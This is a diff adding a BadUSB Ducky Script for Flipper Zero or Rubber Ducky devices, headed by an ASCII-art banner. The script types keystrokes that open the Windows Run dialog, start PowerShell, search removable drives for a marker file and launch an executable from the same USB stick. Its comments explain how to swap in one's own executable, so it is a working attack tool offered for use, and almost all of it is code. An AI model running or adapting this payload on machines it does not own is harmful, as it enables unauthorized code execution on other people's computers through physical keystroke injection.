@@ -1,0 +1,69 @@
+REM                                                                    _..._       .-'''-.                 .-'''-.
+REM                                                                 .-'_..._''.   '   _    \  .---.       '   _    \
+REM /|                                                            .' .'      '.\/   /` '.   \ |   |.--. /   /` '.   \
+REM ||    .-.          .-                                        / .'          .   |     \  ' |   ||__|.   |     \  '
+REM ||     \ \        / /                               .-,.--. . '            |   '      |  '|   |.--.|   '      |  '
+REM ||  __  \ \      / /                          __    |  .-. || |            \    \     / / |   ||  |\    \     / /
+REM ||/'__ '.\ \    / /            .--------.  .:--.'.  | |  | || |             `.   ` ..' /  |   ||  | `.   ` ..' /
+REM |:/`  '. '\ \  / /             |____    | / |   \ | | |  | |. '                '-...-'`   |   ||  |    '-...-'`
+REM ||     | | \ `  /                  /   /  `" __ | | | |  '-  \ '.          .              |   ||  |
+REM ||\    / '  \  /                 .'   /    .'.''| | | |       '. `._____.-'/              |   ||__|
+REM |/\'..' /   / /                 /    /___ / /   | |_| |         `-.______ /               '---'
+REM '  `'-'`|`-' /                 |         |\ \._,\ '/|_|                  `
+REM          '..'                  |_________| `--'  `"
+
+REM Do you want BadUSB / Ducky Script to run an executable but don't want to/cannot download the executable?
+REM This script tests all removable drive root directories for a certain file with a random file name.
+REM IF this file is detected, this means this drive is the removable you're using to launch the executable.
+REM How to use this script?
+REM Copy your executable to a USB drive, copy this Ducky script to your Flipper Zero or Rubber Ducky, generate a file 
+REM with a random file name and change the value of $ExeName, $ExeParams and $FindMe below accordingly.
+
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+ALTCODE $ExeName = "calc.exe"
+ENTER
+ALTCODE $ExeParams = ""
+ENTER
+ALTCODE $FindMe = "4e657a1d-b1a5-4a75-8e45-9a82791a2f21.txt"
+ENTER
+STRING $found = $false
+ENTER
+ENTER
+STRING while (-not $found) {
+ENTER
+STRING $drives = Get-WmiObject -Class Win32_Volume | Where-Object { $_.DriveType -eq 2 }
+ENTER
+ENTER
+STRING foreach ($drive in $drives) {
+ENTER
+STRING $path = Join-Path -Path $drive.Name -ChildPath $FindMe
+ENTER
+STRING if (Test-Path $path) {
+ENTER
+ALTCODE Write-Host "File found at: $path"
+ENTER
+STRING $found = $true
+ENTER
+STRING $exePath = Join-Path -Path $drive.Name -ChildPath $ExeName
+ENTER
+STRING if ([string]::IsNullOrWhiteSpace($ExeParams)) {
+ENTER
+STRING Start-Process -FilePath $exePath -Wait
+ENTER
+STRING }
+ENTER
+STRING else {
+ENTER
+ALTCODE Start-Process -FilePath $exePath -ArgumentList ($ExeParams -split ' ') -Wait
+ENTER
+STRING }
+ENTER
+STRING break
+ENTER
+STRING }}}
+ENTER
